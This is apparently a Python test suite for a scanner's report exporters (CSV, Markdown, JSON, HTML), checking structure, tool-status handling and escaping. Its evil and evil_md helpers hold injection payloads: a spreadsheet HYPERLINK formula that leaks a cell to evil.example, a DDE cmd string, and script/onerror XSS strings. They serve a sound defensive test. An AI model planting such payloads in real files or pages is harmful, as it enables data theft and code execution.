"""Report export tests: the REAL report code (HTML/PDF context, Markdown, CSV, JSON) run on a scan fixture. The database layer is stubbed,
so this is a separate process from test_security_guards.py (it replaces modules in sys.modules).

  python tests/test_report_exports.py
"""
import copy, csv, datetime as dt, io, json, os, sys, types

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
P = F = 0
def t(name, ok, extra=""):
    global P, F
    if ok: P += 1; print("PASS ", name)
    else: F += 1; print("FAIL ", name, extra)

def _stub(name, **attrs):
    m = types.ModuleType(name); [setattr(m, k, v) for k, v in attrs.items()]; sys.modules[name] = m
class _D: pass
_stub("sqlalchemy", select=lambda *a, **k: None, inspect=lambda o: types.SimpleNamespace(unloaded=set()))
_stub("sqlalchemy.ext"); _stub("sqlalchemy.ext.asyncio", AsyncSession=_D); _stub("sqlalchemy.orm", selectinload=lambda *a, **k: None)
_stub("app.models.scan", Scan=_D); _stub("app.models.report", Report=_D); _stub("app.models.vulnerability", Vulnerability=_D)
import jinja2
import app.services.report_service as rs

FIX = json.load(open(os.path.join(HERE, "fixtures", "scan_recon.json"), encoding="utf-8"))
def build(data=None, scan_type=None, mutate=None):
    d = copy.deepcopy(data or FIX)
    if scan_type: d["scan"]["scan_type"] = scan_type
    if mutate: mutate(d)
    P_ = lambda s: dt.datetime.fromisoformat(s) if s else None
    def pj(raw):
        try:
            x = json.loads(raw); return x if isinstance(x, dict) else {"output": raw}
        except ValueError:
            return {"output": raw}
    vs = [types.SimpleNamespace(id=v["id"], vuln_name=v["name"], severity=v["severity"], port=v["port"], service=v["service"], description=v["description"],
          cve_id=v["cve_id"], cvss_score=v["cvss_score"], created_at=P_(v["created_at"]), fixes=[]) for v in d["vulnerabilities"]]
    ts = [types.SimpleNamespace(tool_name=x["tool_name"], raw_output=x["raw_output"], parsed_output=pj(x["raw_output"]), duration_ms=x["duration_ms"], exit_code=x["exit_code"]) for x in d["tool_results"]]
    ai = [types.SimpleNamespace(response=a["response"], summary=a["summary"], risk_level=a["risk_level"]) for a in d["ai_analyses"]]
    s = d["scan"]
    return types.SimpleNamespace(id=s["id"], target=s["target"], scan_type=s["scan_type"], status=s["status"], risk_level=s["risk_level"], created_at=P_(s["created_at"]),
        started_at=P_(s["started_at"]), completed_at=P_(s["completed_at"]), vulnerabilities=vs, tool_results=ts, ai_analyses=ai, project=None, initiated_by="x")
def tool(scan, name): return next(x for x in scan.tool_results if x.tool_name == name)
def html(scan):
    ctx = rs._build_context(scan, dict(rs.DEFAULT_REPORT_BRANDING, report_theme="dark"))
    return jinja2.Environment(loader=jinja2.FileSystemLoader(os.path.join(os.path.dirname(HERE), "templates")), autoescape=True).get_template("report.html.j2").render(**ctx), ctx

SKIP = '{"skipped": true, "reason": "SSL Labs assesses public host names, not IP addresses", "host": "192.0.2.10"}'

print("=== CSV ===")
sc = build(); c = rs.generate_csv_report(sc); rows = list(csv.DictReader(io.StringIO(c)))
t("CSV has Remediation and Evidence columns and one row per finding", {"Remediation", "Evidence"} <= set(rows[0]) and len(rows) == 5)
t("CSV rows are most severe first and carry the AI's fix", rows[0]["Severity"] == "CRITICAL" and rows[0]["Remediation"].startswith("Disable SMBv1"))
t("CSV states the evidence: a CVE cited by the AI but absent from every tool output is said so", "was cited by the AI and does not appear in any tool output" in rows[0]["Evidence"])
def evil(d):
    d["vulnerabilities"][0].update(name='=HYPERLINK("http://evil.example/?x="&A1,"click")', description="+cmd|' /C calc'!A0", service="@SUM(1+1)", port="-5")
    d["ai_analyses"][0]["response"] = d["ai_analyses"][0]["response"].replace("Disable SMBv1, enable SMBv3", "=1+1 Disable SMBv1, enable SMBv3")
sc2 = build(mutate=evil); rows2 = list(csv.DictReader(io.StringIO(rs.generate_csv_report(sc2))))
bad = [(k, v) for r in rows2 for k, v in r.items() if k not in ("ID", "Date Found", "CVSS Score") and v.lstrip()[:1] and v.lstrip()[:1] in "=+-@"]
t("CSV INJECTION: no text cell begins with = + - @ (a spreadsheet would run it as a formula)", not bad, bad)
t("the neutralised cells still show the original text", rows2[0]["Name"].startswith("'=HYPERLINK") and rows2[0]["Service"] == "'@SUM(1+1)")

print("=== Markdown ===")
md = rs.generate_markdown_report(sc)
t("Markdown: no raw 'VULN: ... | SEVERITY:' machine format anywhere", "VULN:" not in md and "| SEVERITY:" not in md and "RISK_LEVEL:" not in md)
t("Markdown: the summary is complete (not cut at a character limit)", "Immediate patching and network segmentation are required." in md)
t("Markdown: every finding shows Remediation and Evidence", md.count("**Remediation:**") == 5 and md.count("*Evidence:") == 5)
t("Markdown: the assessment banner (ssl error) and the reconnaissance-only note are there", "This assessment is incomplete." in md and "reconnaissance-only assessment" in md)
t("Markdown: nmap is a complete table of all 14 ports (was JSON cut after the first port)", "| 2869 | tcp | http |" in md and md.count("| msrpc |") >= 6 and "| 554 | tcp | rtsp? | — |" in md)
t("Markdown: the failed ssl tool says FAILED with the reason", "**Status:** FAILED — Assessment still in progress" in md)
t("Markdown: the tool output section is compact (a huge WHOIS record no longer fills it)", len(md[md.index("## Tool Output"):md.index("## AI Analysis")]) < 3500)
def evil_md(d):
    d["vulnerabilities"][1].update(name="Evil | name <img src=x onerror=alert(1)> [click](http://evil.example)", description="x <script>alert(1)</script>")
    d["tool_results"][1]["raw_output"] = '{"query": "```\\nbreakout\\n```", "count": 0, "exploits": []}'
md2 = rs.generate_markdown_report(build(mutate=evil_md))
t("Markdown INJECTION: pipes, HTML and links in finding text are escaped", "<img" not in md2 and "<script>" not in md2 and "\\|" in md2 and "\\[click\\]" in md2)
t("Markdown INJECTION: backticks in tool output cannot end the code block early", "````" in md2)

print("=== JSON ===")
js = json.loads(rs.generate_json_report(sc))
t("JSON: an error object from a tool is NOT counted as success (assessment incomplete, ssl failed with its reason)", js["assessment"]["complete"] is False and js["assessment"]["tools_failed"] == 1 and "ssl" in js["assessment"]["failures"][0])
t("JSON: each tool has a status", {x["tool_name"]: x["status"] for x in js["tool_results"]} == {"osint": "ok", "poc_index": "ok", "ssl": "failed", "nmap": "ok"})
t("JSON: each finding has remediation and evidence; the unconfirmed CVE is listed", all(v["remediation"] for v in js["vulnerabilities"]) and js["vulnerabilities"][0]["evidence"]["cves_unconfirmed"] == ["CVE-2017-0144"])
t("JSON: reconnaissance-only note and the parsed AI summary and findings are present", "reconnaissance-only" in (js["assessment"]["note"] or "") and js["ai_analyses"][0]["summary"].startswith("The target runs unpatched") and len(js["ai_analyses"][0]["findings"]) == 5)
t("JSON: the complete raw tool output is still there for machine use", "ARIN WHOIS" in js["tool_results"][0]["raw_output"])

print("=== skipped tools are neither failures nor successes ===")
scs = build(mutate=lambda d: d["tool_results"][2].update(raw_output=SKIP))
jss = json.loads(rs.generate_json_report(scs)); mds = rs.generate_markdown_report(scs)
t("a skipped tool does not make the assessment incomplete", jss["assessment"]["complete"] is True and jss["assessment"]["tools_skipped"] == 1 and jss["assessment"]["tools_failed"] == 0 and "incomplete" not in mds.lower().split("## vulnerability summary")[0].replace("recon", ""))
t("the skip and its reason are stated", "Not applicable to this target and skipped: ssl: SSL Labs assesses public host names" in mds and "SKIPPED — SSL Labs assesses public host names" in mds)
hs, cs = html(scs)
t("HTML: a skipped tool is labelled SKIPPED with its reason, with no table of N/A cells", "SKIPPED" in hs and "SSL Labs assesses public host names" in hs and "FORWARD SECRECY" not in hs and cs["scan_incomplete"] is False)

print("=== nothing ran ===")
def allfail(d):
    for x in d["tool_results"]: x["raw_output"] = "[!] MCP error: {'code': -32000, 'message': 'Target address is in a blocked range'}"
sa = build(mutate=allfail); ha, ca = html(sa)
t("when every applicable tool failed the cover and Markdown say INCOMPLETE, not a risk level", ca["cover_risk"] == "INCOMPLETE" and "**Risk Level:** INCOMPLETE" in rs.generate_markdown_report(sa) and "This assessment did not run." in rs.generate_markdown_report(sa))

print("=== HTML / PDF ===")
h, ctx = html(sc)
t("HTML: remediation and evidence under each finding, no raw AI format", h.count("Remediation") >= 5 and h.count("was cited by the AI and does not appear") == 2 and "VULN:" not in h)
t("HTML: the reconnaissance-only note is in the executive summary", "reconnaissance-only assessment" in h and "not confirmed" in h)
t("HTML: the failed ssl tool shows one clear line, not an N/A grade table", "Did not complete: Assessment still in progress" in h and "FORWARD SECRECY" not in h)
t("HTML: the WHOIS record is not dumped (one short line with a pointer to the JSON export; no stray braces, no repeated target)", "the full text is in the JSON export" in h and h.count("ARIN WHOIS") <= 1 and '<li>{</li>' not in h)
t("the JSON shown for a tool without a presenter has long text cut with an explicit note", "more characters not shown" in next(r for r in ctx["tool_results"] if r["tool_name"] == "osint")["formatted_output"])
t("HTML: all 14 nmap ports are listed", "<td>2869</td>" in h and h.count("<td>msrpc</td>") >= 7)
t("a scan type other than recon_only has no reconnaissance note", "reconnaissance-only" not in html(build(scan_type="full"))[0] and json.loads(rs.generate_json_report(build(scan_type="full")))["assessment"]["note"] is None)
def noport(d): d["tool_results"] = [x for x in d["tool_results"] if x["tool_name"] != "nmap"]
jn = json.loads(rs.generate_json_report(build(mutate=noport)))
t("with no port-scan result the report makes no claim about whether a port was open", all(v["evidence"]["port_state"] == "unknown" and not any("Port" in n for n in v["evidence"]["notes"]) for v in jn["vulnerabilities"]))

print(f"\nRESULT: {P} passed, {F} failed")
sys.exit(1 if F else 0)
